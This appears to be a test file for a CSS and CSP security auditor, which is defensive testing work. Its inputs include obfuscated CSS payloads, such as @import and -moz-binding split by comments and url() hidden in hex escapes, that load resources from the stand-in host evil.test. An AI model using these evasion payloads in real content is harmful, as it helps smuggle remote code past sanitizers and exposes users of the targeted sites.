import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { auditCss } from '../src/css.ts';
import { auditCsp, resolveScriptSources, parsePolicies } from '../src/csp.ts';

describe('Additional adversarial edge cases', () => {
  it('catches @import split by comments and escapes across newlines', () => {
    const payload = '@im/*x*/por\\74 \n url("https://evil.test/s.css");';
    const result = auditCss(payload, { allowedHosts: ['ok.example.com'] });
    assert.ok(result.findings.some((f) => f.code === 'AT_IMPORT'));
  });

  it('catches -moz-binding hidden behind comment splitting', () => {
    const payload = '-moz-bi/**/nding: url("https://evil.test/x.xml");';
    const result = auditCss(payload, { allowedHosts: ['ok.example.com'] });
    assert.ok(result.findings.some((f) => f.code === 'MOZ_BINDING'));
  });

  it('flags wildcard inherited through the default-src fallback chain', () => {
    // No script-src: the wildcard comes from default-src and must be detected.
    const result = auditCsp("default-src *; object-src 'none'; base-uri 'none'");
    assert.ok(result.findings.some((f) => f.code === 'WILDCARD_SCRIPT'));
    const effective = resolveScriptSources(parsePolicies("default-src *")[0]);
    assert.equal(effective.resolvedFrom, 'default-src');
  });

  it('treats upper-case CSP keywords and directive names case-insensitively', () => {
    const result = auditCsp(
      "SCRIPT-SRC 'UNSAFE-INLINE' 'unsafe-eval'; OBJECT-SRC 'none'; BASE-URI 'none'",
    );
    assert.ok(result.findings.some((f) => f.code === 'UNSAFE_INLINE'));
    assert.ok(result.findings.some((f) => f.code === 'UNSAFE_EVAL'));
  });

  it('decodes fully escaped url() with no whitespace after hex sequence', () => {
    // \75rl -> url, \68ttps -> https, all packed together.
    const payload = 'a{background:\\75rl("\\68ttps://evil.test/x")}';
    const result = auditCss(payload, { allowedHosts: ['ok.example.com'] });
    assert.ok(
      result.findings.some((f) => f.code === 'EXTERNAL_URL'),
      result.findings.map((f) => f.code).join(','),
    );
  });

  it('reports original-source offsets for normalized findings', () => {
    const payload = 'a{color:red}  \\75 rl("https://evil.test/x")';
    const result = auditCss(payload, { allowedHosts: ['ok.example.com'] });
    const external = result.findings.find((f) => f.code === 'EXTERNAL_URL');
    assert.ok(external);
    assert.ok(external!.offset >= 0 && external!.offset < payload.length);
    assert.equal(payload[external!.offset], '\\');
  });
});
